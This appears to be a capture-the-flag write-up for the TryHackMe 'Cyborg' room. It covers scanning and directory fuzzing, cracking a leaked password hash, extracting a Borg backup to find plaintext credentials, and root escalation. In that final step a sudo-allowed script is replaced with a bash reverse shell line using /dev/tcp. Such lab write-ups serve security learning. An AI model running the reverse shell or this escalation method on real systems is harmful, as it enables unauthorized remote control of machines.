```bash
# PLATFORM          . THM
# CTF NAME          . Cyborg
# DESCRIPTION       . A box involving encrypted archives, source code analysis and more.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/cyborgt8
```

```bash
sudo nmap -sSVC -T5 10.10.143.145 -p- -oN cyborg
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dbb270f307ac32003f81b8d03a89f365 (RSA)
|   256 68e6852f69655be7c6312c8e4167d7ba (ECDSA)
|_  256 562c7992ca23c3914935fadd697ccaab (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- I have started a fuzzer while the nmap scan was running.

```
ffuf -u http://10.10.143.145/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
etc                     [Status: 301, Size: 312, Words: 20, Lines: 10]
```

- Inside `/etc` we find a directory called `squid` containing two files, `passwd` and `squid.conf`. 

```squid.conf
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

```passwd
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

- We got the hash for whatever is `music_archive`.

- Running a simple `john` against this file reveals the password.

```
squidward        (music_archive)     
```

- The `admin` page has some information laying around, a stupid conversation - but the piece of information that matters to us is located in `Archive - Download`.

- We will download a `archive.tar` file that can be unzipped using `tar -xf`. It contains a folder called `home`. 

- By navigating to `/home/field/dev/final_archive` all we can find is some files that aren't of much use to us - in this form, at least.

```
config  data  hints.5  index.5  integrity.5  nonce  README
```

```README
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

- So we know this is a Borg Backup. After some googling around, I found out that it can be easily installed and `borg list [path]` can be used to list Borg Backups in a certain path.

- Using `borg list /home/field/dev/final_archive` will ask for a passphase, which is the password found above.

```
music_archive                        Tue, 2020-12-29 16:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

- It seems that there's one Borg Backup. Let's extract it.

```
borg extract -v --list home/field/dev/final_archive/::music_archive
```

```
home/alex
home/alex/.bashrc
home/alex/.bash_logout
home/alex/.profile
home/alex/Music
home/alex/.bash_history
home/alex/.dbus
home/alex/.dbus/session-bus
home/alex/.dbus/session-bus/c707f46991feb1ed17e415e15fe9cdae-0
home/alex/.config
home/alex/.config/sublime-text-3
home/alex/.config/sublime-text-3/Cache
home/alex/.config/sublime-text-3/Cache/ActionScript
home/alex/.config/sublime-text-3/Cache/ActionScript/ActionScript.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/AppleScript
home/alex/.config/sublime-text-3/Cache/AppleScript/AppleScript.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/ASP
home/alex/.config/sublime-text-3/Cache/ASP/ASP.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/ASP/HTML-ASP.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Batch File
home/alex/.config/sublime-text-3/Cache/Batch File/Batch File.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/C#
home/alex/.config/sublime-text-3/Cache/C#/Build.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/C#/C#.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/C++
home/alex/.config/sublime-text-3/Cache/C++/C.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/C++/C++.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Clojure
home/alex/.config/sublime-text-3/Cache/Clojure/Clojure.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/CSS
home/alex/.config/sublime-text-3/Cache/CSS/CSS.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/D
home/alex/.config/sublime-text-3/Cache/D/D.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/D/DMD Output.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Diff
home/alex/.config/sublime-text-3/Cache/Diff/Diff.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Erlang
home/alex/.config/sublime-text-3/Cache/Erlang/Erlang.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Erlang/HTML (Erlang).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Attributes.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Commit.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Common.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Config.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Ignore.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Link.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Log.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Git Formats/Git Rebase.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Go
home/alex/.config/sublime-text-3/Cache/Go/Go.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Graphviz
home/alex/.config/sublime-text-3/Cache/Graphviz/DOT.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Groovy
home/alex/.config/sublime-text-3/Cache/Groovy/Groovy.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Haskell
home/alex/.config/sublime-text-3/Cache/Haskell/Haskell.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Haskell/Literate Haskell.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/HTML
home/alex/.config/sublime-text-3/Cache/HTML/HTML.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Java
home/alex/.config/sublime-text-3/Cache/Java/Java.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Java/Java Server Pages (JSP).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Java/JavaDoc.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Java/JavaProperties.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/JavaScript
home/alex/.config/sublime-text-3/Cache/JavaScript/JavaScript.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/JavaScript/JSON.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/JavaScript/Regular Expressions (JavaScript).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/LaTeX
home/alex/.config/sublime-text-3/Cache/LaTeX/Bibtex.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/LaTeX/LaTeX Log.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/LaTeX/TeX.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Lisp
home/alex/.config/sublime-text-3/Cache/Lisp/Lisp.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Lua
home/alex/.config/sublime-text-3/Cache/Lua/Lua.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Makefile
home/alex/.config/sublime-text-3/Cache/Makefile/Make Output.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Makefile/Makefile.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Markdown
home/alex/.config/sublime-text-3/Cache/Markdown/Markdown.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Markdown/MultiMarkdown.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Matlab
home/alex/.config/sublime-text-3/Cache/Matlab/Matlab.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Objective-C
home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Objective-C/Objective-C++.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/OCaml
home/alex/.config/sublime-text-3/Cache/OCaml/camlp4.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/OCaml/OCaml.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/OCaml/OCamllex.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/OCaml/OCamlyacc.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Pascal
home/alex/.config/sublime-text-3/Cache/Pascal/Pascal.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Perl
home/alex/.config/sublime-text-3/Cache/Perl/Perl.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/PHP
home/alex/.config/sublime-text-3/Cache/PHP/PHP.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/PHP/PHP Source.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/PHP/Regular Expressions (PHP).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Python
home/alex/.config/sublime-text-3/Cache/Python/Python.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Python/Regular Expressions (Python).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/R
home/alex/.config/sublime-text-3/Cache/R/R.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/R/R Console.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/R/Rd (R Documentation).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rails
home/alex/.config/sublime-text-3/Cache/Rails/HTML (Rails).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rails/JavaScript (Rails).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rails/Ruby Haml.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rails/Ruby on Rails.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rails/SQL (Rails).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Regular Expressions
home/alex/.config/sublime-text-3/Cache/Regular Expressions/RegExp.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/RestructuredText
home/alex/.config/sublime-text-3/Cache/RestructuredText/reStructuredText.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Ruby
home/alex/.config/sublime-text-3/Cache/Ruby/Ruby.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rust
home/alex/.config/sublime-text-3/Cache/Rust/Cargo.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Rust/Rust.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Scala
home/alex/.config/sublime-text-3/Cache/Scala/Scala.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/ShellScript
home/alex/.config/sublime-text-3/Cache/ShellScript/Bash.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/ShellScript/commands-builtin-shell-bash.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/ShellScript/Shell-Unix-Generic.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/SQL
home/alex/.config/sublime-text-3/Cache/SQL/SQL.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/TCL
home/alex/.config/sublime-text-3/Cache/TCL/HTML (Tcl).sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/TCL/Tcl.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Text
home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.cache
home/alex/.config/sublime-text-3/Cache/Text/Plain text.tmLanguage.rcache
home/alex/.config/sublime-text-3/Cache/Textile
home/alex/.config/sublime-text-3/Cache/Textile/Textile.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/XML
home/alex/.config/sublime-text-3/Cache/XML/XML.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/YAML
home/alex/.config/sublime-text-3/Cache/YAML/YAML.sublime-syntax.cache
home/alex/.config/sublime-text-3/Cache/Default
home/alex/.config/sublime-text-3/Cache/Default/Syntax Summary.cache
home/alex/.config/sublime-text-3/Cache/Default/Meta Info Summary.cache
home/alex/.config/sublime-text-3/Cache/Default/Startup.cache
home/alex/.config/sublime-text-3/Packages
home/alex/.config/sublime-text-3/Packages/User
home/alex/.config/sublime-text-3/Local
home/alex/.config/sublime-text-3/Local/Auto Save Session.sublime_session
home/alex/.config/sublime-text-3/Lib
home/alex/.config/sublime-text-3/Lib/python3.3
home/alex/.config/sublime-text-3/Installed Packages
home/alex/.config/ibus
home/alex/.config/ibus/bus
home/alex/Documents
home/alex/Documents/note.txt
home/alex/Public
home/alex/Videos
home/alex/Desktop
home/alex/Desktop/secret.txt
home/alex/Downloads
home/alex/Templates
home/alex/Pictures
```

```bash
find . -name *.txt 

./Desktop/secret.txt
./Documents/note.txt
```

```secret
shoutout to all the people who have gotten to this stage whoop whoop!"
```

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

- Alright, so we have access to the box now. 

```
sudo -l

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- A simple cat reveals the source code of the script, which, in short, does backup of .mp3 files.

- However, a `ls -l` reveals that this file is owned by us, so we can replace its content with anything we like. And ...  you know what we like :) 

- **NOTE:** Use `chmod` to allow write permissions on the file first.

- After replacing the content with a bash reverse shell, run the script as `sudo /etc/mp3backups/backup.sh`

```backup.sh
#!/bin/bash
sh -i >& /dev/tcp/ip/port 0>&1
```

- The last flag is in `/root/root.txt`